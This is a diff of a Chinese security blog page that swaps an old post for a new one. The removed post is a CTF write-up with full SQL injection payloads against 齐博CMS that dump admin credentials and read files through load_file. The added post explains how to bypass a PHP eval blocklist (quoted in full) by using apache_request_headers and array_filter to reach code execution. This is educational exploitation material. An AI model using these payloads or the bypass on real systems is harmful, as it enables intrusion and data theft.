@@ -6,29 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://black0saturday.github.io">
-  <title>再见CMS--齐博CMS | 一次就好</title>
+  <title>从受限的代码执行到任意代码执行 | 一次就好</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="刚刚在i春秋上做了一道CMS的题，学到的东西挺多的，这里记录一下  题目名称：再见CMS题目内容：这里还是有一个小脑洞">
+  <meta name="description" content="受限的代码执行如下，一处刺眼的eval代码这个利用点在信安之路上一篇文章已经有分析到了，所以不做过多流程上的分析，只关注如何 Bypass，完成 RCE。问题的关键是要绕过 danger_key 的处理，具体的代码如下 &#x2F;&#x2F;过滤危险字符，保留正常字符 function danger_key($s,$type&#x3D;&amp;apos;&amp;apos;) {   $s&#x3D;empty($type) ? htmlspeci">
 <meta property="og:type" content="article">
-<meta property="og:title" content="再见CMS--齐博CMS">
-<meta property="og:url" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/index.html">
+<meta property="og:title" content="从受限的代码执行到任意代码执行">
+<meta property="og:url" content="http://black0saturday.github.io/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="一次就好">
-<meta property="og:description" content="刚刚在i春秋上做了一道CMS的题，学到的东西挺多的，这里记录一下  题目名称：再见CMS题目内容：这里还是有一个小脑洞">
-<meta property="og:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/1.png">
-<meta property="og:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/2.png">
-<meta property="og:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/4.png">
-<meta property="og:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/5.png">
-<meta property="og:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/6.png">
-<meta property="og:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/7.png">
-<meta property="og:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/8.png">
-<meta property="og:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/9.png">
-<meta property="og:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/10.png">
-<meta property="article:published_time" content="2018-09-21T11:50:28.000Z">
-<meta property="article:modified_time" content="2019-12-30T10:31:51.360Z">
+<meta property="og:description" content="受限的代码执行如下，一处刺眼的eval代码这个利用点在信安之路上一篇文章已经有分析到了，所以不做过多流程上的分析，只关注如何 Bypass，完成 RCE。问题的关键是要绕过 danger_key 的处理，具体的代码如下 &#x2F;&#x2F;过滤危险字符，保留正常字符 function danger_key($s,$type&#x3D;&amp;apos;&amp;apos;) {   $s&#x3D;empty($type) ? htmlspeci">
+<meta property="og:image" content="http://black0saturday.github.io/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.webp">
+<meta property="og:image" content="http://black0saturday.github.io/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png">
+<meta property="og:image" content="http://black0saturday.github.io/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.png">
+<meta property="og:image" content="http://black0saturday.github.io/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.png">
+<meta property="article:published_time" content="2020-04-21T10:09:01.000Z">
+<meta property="article:modified_time" content="2020-04-21T10:16:13.699Z">
 <meta property="article:author" content="布布f">
-<meta property="article:tag" content="CMS">
+<meta property="article:tag" content="代码执行">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/1.png">
+<meta name="twitter:image" content="http://black0saturday.github.io/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.webp">
   
     <link rel="alternative" href="/atom.xml" title="一次就好" type="application/atom+xml">
   
@@ -180,76 +175,58 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-再见CMS-齐博CMS" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-从受限的代码执行到任意代码执行" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      再见CMS--齐博CMS
+      从受限的代码执行到任意代码执行
     </h1>
   
 
         
-        <a href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/" class="archive-article-date">
-  	<time datetime="2018-09-21T11:50:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-21</time>
+        <a href="/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="archive-article-date">
+  	<time datetime="2020-04-21T10:09:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-21</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>刚刚在i春秋上做了一道CMS的题，学到的东西挺多的，这里记录一下</p>
-<blockquote>
-<p>题目名称：再见CMS<br>题目内容：这里还是有一个小脑洞<br><a id="more"></a><br>访问链接之后看到的是一个网站，输入<code>url/admin</code>直接就进入了后台（不过这道题没什么用）</p>
-</blockquote>
-<pre><code>渗透CMS网站的三个步骤：
-        1. 第一步,肯定是要判断出cms类型
-        2. 第二步,查询该cms曾经出现的漏洞
-        3. 第三步,然后利用这些漏洞拿到flag.
-</code></pre><h3 id="0x01-第一步，判断CMS类型："><a href="#0x01-第一步，判断CMS类型：" class="headerlink" title="0x01 第一步，判断CMS类型："></a>0x01 第一步，判断CMS类型：</h3><p>恕我太菜，看了半天也没判断出来是哪种类型，人家说拿最下边的备案号到工信部一查就有网站的信息了，可是我查了一下返回没有匹配到类型，然后看了一下别人的writeup，说是齐博CMS</p>
-<p>知道了CMS类型就要进行第二步了</p>
-<h3 id="0x02-第二步，搜索齐博CMS的漏洞"><a href="#0x02-第二步，搜索齐博CMS的漏洞" class="headerlink" title="0x02 第二步，搜索齐博CMS的漏洞"></a>0x02 第二步，搜索齐博CMS的漏洞</h3><p>百度上一找还是有漏洞的，最典型的就是SQL注入了，接下来我们来看看如何进行注入<br>先注册一个用户，然后登录上去<br>根据搜索出来的文章，漏洞在<code>/member/userinfo.php?job=edit&amp;step=2</code>这个页面，这里存放的是个人信息，我们的注入就是通过构造语句把需要的信息显示在这些个人信息后边：<br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/1.png" alt></p>
-<pre><code>根据网上提供的漏洞利用方法，构造这样一个注入语句：
-http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2
-post数据：
-old_password=123456truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select version()) where uid=3 %23 
-</code></pre><p>这个URL其实是对个人信息修改的URL，我们访问这个URL就可以修改个人信息<br>而下边POST的数据就是要修改的东西<br>old_password是旧密码，后边uid是我们访问个人信息页面时URL里给的，重点在address里面，<code>address=</code>，这个后边的值本来应该填写你要修改的新地址的，我们把注入语句放到这里就可以把注入查询到的东西显示在页面的<code>联系地址</code>后边<br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/2.png" alt><br>填好之后访问一下会返回<code>修改成功，页面正在跳转</code><br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/4.png" alt></p>
-<p>然后我们查看一下个人信息，主要看<code>联系地址</code>一栏<br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/5.png" alt></p>
-<p>我们可以看到注入成功了，返回了我们需要的东西，那么就开始注入吧。</p>
-<pre><code>查询数据库：
-URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2
-POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=test@qq.com&amp;provinceid=,address=(select database()) where uid=3 %23 
-
-返回数据库：blog
-</code></pre><p><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/6.png" alt></p>
-<pre><code>查询表:
-URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2
-POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=test@qq.com&amp;provinceid=,address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid=3 %23 
-
-查到了很多的表，但是我觉得就第一个有用：admin
-</code></pre><p><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/7.png" alt><br>    查询列：<br>    URL:<a href="http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2" target="_blank" rel="noopener">http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2</a><br>    POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]<a href="mailto:=&amp;email=test@qq.com">=&amp;email=test@qq.com</a>&amp;provinceid=,address=(select group_concat(column_name) from information_schema.columns where table_name=0x61646d696e) where uid=3 %23 </p>
-<pre><code>hint:这里由于‘table_name=’的值需要带引号的，但是带了引号语句就报错了，所以利用十六进制来绕过，可以不用带引号
-
-返回列：id,username,password,Email
-</code></pre><p><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/8.png" alt></p>
-<pre><code>查询字段：
-URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2
-POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=test@qq.com&amp;provinceid=,address=(select group_concat(username,password) from admin) where uid=3 %23 
-
-返回username:admin   password:2638127c92b79ee7901195382dc08068
-</code></pre><p><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/9.png" alt></p>
-<p>去了各种md5解码网站都查不出来，无奈可能是思路错了</p>
-<p>然后访问了一下<code>url/flag.php</code>,输出了flag is here  那么我们的任务就是查看这个文件了</p>
-<p>如何利用SQL注入查看文件呢？</p>
-<p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html" target="_blank" rel="noopener" title="SQL注入查看文件">https://www.cnblogs.com/blacksunny/p/8060028.html</a></p>
-<p>知道了这个方法我们就来构造payload：</p>
-<pre><code>URL:http://ac8bc12353794ed29c196e52eed992b7627b70cb34e54358.game.ichunqiu.com/member/userinfo.php?job=edit&amp;step=2
-    POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=test@qq.com&amp;provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid=3 %23
-</code></pre><p>括号里的十六进制是要查看的文件的路径<code>/var/www/html/flag.php</code>，我们可以在主页的最上边看到网站的绝对路径</p>
-<p>访问之后再查看个人信息的联系地址一栏发现是空的，没关系  查看页面源代码<br><img src="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/10.png" alt></p>
-<p>这样就得到了flag</p>
+        <h2 id="受限的代码执行"><a href="#受限的代码执行" class="headerlink" title="受限的代码执行"></a>受限的代码执行</h2><p>如下，一处刺眼的eval代码<br><img src="/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.webp" alt><br>这个利用点在信安之路上一篇文章已经有分析到了，所以不做过多流程上的分析，只关注如何 Bypass，完成 RCE。问题的关键是要绕过 danger_key 的处理，具体的代码如下</p>
+<pre><code>//过滤危险字符，保留正常字符
+function danger_key($s,$type=&apos;&apos;) {
+  $s=empty($type) ? htmlspecialchars($s) : $s;
+        $danger=array(&apos;php&apos;,&apos;preg&apos;,&apos;server&apos;,&apos;chr&apos;,&apos;decode&apos;,&apos;html&apos;,&apos;md5&apos;,&apos;post&apos;,&apos;get&apos;,&apos;file&apos;,&apos;cookie&apos;,&apos;session&apos;,&apos;sql&apos;,&apos;del&apos;,&apos;encrypt&apos;,&apos;$&apos;,&apos;system&apos;,&apos;exec&apos;,&apos;shell&apos;,&apos;open&apos;,&apos;ini_&apos;,&apos;chroot&apos;,&apos;eval&apos;,&apos;passthru&apos;,&apos;include&apos;,&apos;require&apos;,&apos;assert&apos;,&apos;union&apos;,&apos;create&apos;,&apos;func&apos;,&apos;symlink&apos;,&apos;sleep&apos;);
+  $s = str_ireplace($danger,&quot;*&quot;,$s);
+  $key=array(&apos;php&apos;,&apos;preg&apos;,&apos;decode&apos;,&apos;post&apos;,&apos;get&apos;,&apos;cookie&apos;,&apos;session&apos;,&apos;$&apos;,&apos;exec&apos;,&apos;ascii&apos;,&apos;eval&apos;,&apos;replace&apos;);
+   foreach ($key as $val){
+     if(strpos($s,$val) !==false){
+    error(&apos;很抱歉，执行出错，发现危险字符【&apos;.$val.&apos;】&apos;);
+    }
+   }
+  return $s;
+}
+</code></pre><p>比较棘手的是 $type 值写死传入为 1，所以单双引号都会被实体编码，这导致就算我们传入的函数也难以传入一个字符串作为函数参数。再看下面被过滤的函数，虽然过滤了很多常用的函数，但只要是参数类型为 callback 的函数都可以作为绕过的方法。<strong>所以最先需要解决的是如何突破单双引号的限制，完成字符串的传入。</strong></p>
+<h2 id="寻找输入可控的地方"><a href="#寻找输入可控的地方" class="headerlink" title="寻找输入可控的地方"></a>寻找输入可控的地方</h2><h3 id="问题一：-输入点有哪些？"><a href="#问题一：-输入点有哪些？" class="headerlink" title="问题一： 输入点有哪些？"></a>问题一： 输入点有哪些？</h3><p>一开始总是受于思维的限制，老是认为输入点就是 GPC，可真的是这样吗？并非如此，HTTP 传输的数据不只是 GPC，而是整个协议的格式，如下图，除了 GPC 之外，HTTP 头部都是我们可控的。而且这里并不会被过滤函数处理，是理想的控制输入的地方。<br><img src="/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt></p>
+<h3 id="问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？"><a href="#问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？" class="headerlink" title="问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？"></a>问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？</h3><p>我已经可以通过上面受限的代码执行来执行一些函数，于是我的思路是寻找一个函数可以返回头部信息，而这个函数的要求是不需要参数。可往往不需要参数的函数返回大多是个数组，不过这没关系，在 PHP5.4 版本就新增支持对函数返回数组的成员访问解析的特性，例如 <code>foo()[0]</code> 。翻了翻手册发现了一个函数满足我的要求。</p>
+<pre><code>getallheaders
+(PHP 4, PHP 5, PHP 7)
+getallheaders — 获取全部 HTTP 请求头信息
+说明
+getallheaders ( void ) : array
+</code></pre><p>但我忽略的一个点，get 被替换成 * 所以会导致执行不成功。</p>
+<p><img src="/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.png" alt></p>
+<p>这个好解决手册的下一句就是</p>
+<pre><code>此函数是 apache_request_headers() 的别名。请阅读 apache_request_headers() 文档获得更多信息。
+</code></pre><p>所以直接使用 <code>apache_request_headers()</code> 的效果是一样的。</p>
+<h3 id="问题三：apache-request-headers-返回的数组下标为字符串，而-POST-不可以输入字符串怎么办？"><a href="#问题三：apache-request-headers-返回的数组下标为字符串，而-POST-不可以输入字符串怎么办？" class="headerlink" title="问题三：apache_request_headers 返回的数组下标为字符串，而 POST 不可以输入字符串怎么办？"></a>问题三：apache_request_headers 返回的数组下标为字符串，而 POST 不可以输入字符串怎么办？</h3><p>学习一门语言或多或少都会学习数组的切割操作，所以 array_slice 可以切割获得任意一个元素的值。</p>
+<p>到此，我们可以控制输入，同时绕过了过滤，并且把输入作为参数带入到想要执行的函数里。我选了 array_filter 函数来执行任意代码。</p>
+<p>最后的效果就是如下:<br><img src="/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.png" alt></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>还是蛮有意思的一个绕过，加深理解了一切输入皆有害！花了一两个小时绕这个，还是蛮有趣的。文章没写太细，更多细节就留给各位调试啦。</p>
+<p>原文链接： <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247492745&amp;idx=1&amp;sn=e28fbaaaafd592f9e15816ed74262273&amp;chksm=ec1dd4a1db6a5db79e4a79a4f3e0a760a27b8a41cb32be21e50523d0f3191d6f7d592da9e116&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1587437202496&amp;sharer_shareid=843ff91eb1f047718a68377134a06858#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247492745&amp;idx=1&amp;sn=e28fbaaaafd592f9e15816ed74262273&amp;chksm=ec1dd4a1db6a5db79e4a79a4f3e0a760a27b8a41cb32be21e50523d0f3191d6f7d592da9e116&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1587437202496&amp;sharer_shareid=843ff91eb1f047718a68377134a06858#rd</a></p>
 
       
 
@@ -263,7 +240,7 @@ POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=te
 				
 				<br>
 				<strong>本文链接：</strong>
-				http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/
+				http://black0saturday.github.io/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/
 				<br>
 				<strong>版权声明：</strong>
 				本作品采用
@@ -322,7 +299,7 @@ POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=te
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CMS</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码执行</a>
         		</li>
       		
 		</ul>
@@ -378,7 +355,7 @@ POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=te
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://black0saturday.github.io/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://black0saturday.github.io/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -392,18 +369,9 @@ POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=te
   
 <nav id="article-nav">
   
-    <a href="/2018/09/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%A5%9E%E5%99%A8burpsuite/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          渗透测试神器burpsuite
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Yeser-CMS漏洞利用</div>
+    <a href="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">phpstudy存在后门</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -430,7 +398,7 @@ POST:old_password=123456&amp;truename=xxxx%0000&amp;Limitword[000]=&amp;email=te
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-第一步，判断CMS类型："><span class="toc-number">1.</span> <span class="toc-text">0x01 第一步，判断CMS类型：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-第二步，搜索齐博CMS的漏洞"><span class="toc-number">2.</span> <span class="toc-text">0x02 第二步，搜索齐博CMS的漏洞</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#受限的代码执行"><span class="toc-number">1.</span> <span class="toc-text">受限的代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#寻找输入可控的地方"><span class="toc-number">2.</span> <span class="toc-text">寻找输入可控的地方</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#问题一：-输入点有哪些？"><span class="toc-number">2.1.</span> <span class="toc-text">问题一： 输入点有哪些？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？"><span class="toc-number">2.2.</span> <span class="toc-text">问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#问题三：apache-request-headers-返回的数组下标为字符串，而-POST-不可以输入字符串怎么办？"><span class="toc-number">2.3.</span> <span class="toc-text">问题三：apache_request_headers 返回的数组下标为字符串，而 POST 不可以输入字符串怎么办？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最后"><span class="toc-number">3.</span> <span class="toc-text">最后</span></a></li></ol>
                     </div>
                 </span>
             </div>
